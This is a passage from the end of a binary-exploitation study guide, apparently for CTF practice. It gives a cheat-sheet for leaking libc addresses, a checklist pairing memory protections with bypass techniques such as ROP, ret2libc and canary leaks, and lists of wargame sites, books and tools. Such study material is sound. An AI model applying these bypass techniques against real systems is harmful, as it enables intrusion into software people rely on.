║                                                                  ║
║ LEAK LIBC:                                                       ║
║  puts@plt(puts@got) → leak → calculate base → ret main         ║
║                                                                  ║
║ BYPASS CHECKLIST:                                                ║
║  □ NX → ROP/ret2libc     □ ASLR → Leak addresses               ║
║  □ Canary → Leak/bypass  □ PIE → Leak code addr                ║
║  □ RELRO → Target hooks  □ Seccomp → ORW/x32                   ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## APPENDIX: Additional Resources

### Online Practice Platforms

- **pwnable.kr**: Korean wargame site (beginner to advanced)
- **pwnable.tw**: Taiwan wargame (intermediate to hard)
- **ROP Emporium**: Dedicated ROP practice
- **Exploit.Education**: Protostar, Fusion, Phoenix challenges
- **HackTheBox**: Retired PWN boxes
- **TryHackMe**: Binary exploitation learning paths

### Further Reading

- “Hacking: The Art of Exploitation” by Jon Erickson
- “The Shellcoder’s Handbook” by Chris Anley et al.
- “Practical Binary Analysis” by Dennis Andriesse
- “Binary Exploitation Notes” by ir0nstone (ir0nstone.gitbook.io)

### Tool Documentation

- Pwntools: docs.pwntools.com
- ROPgadget: github.com/JonathanSalwan/ROPgadget
- radare2: book.rada.re
- GEF: hugsy.github.io/gef
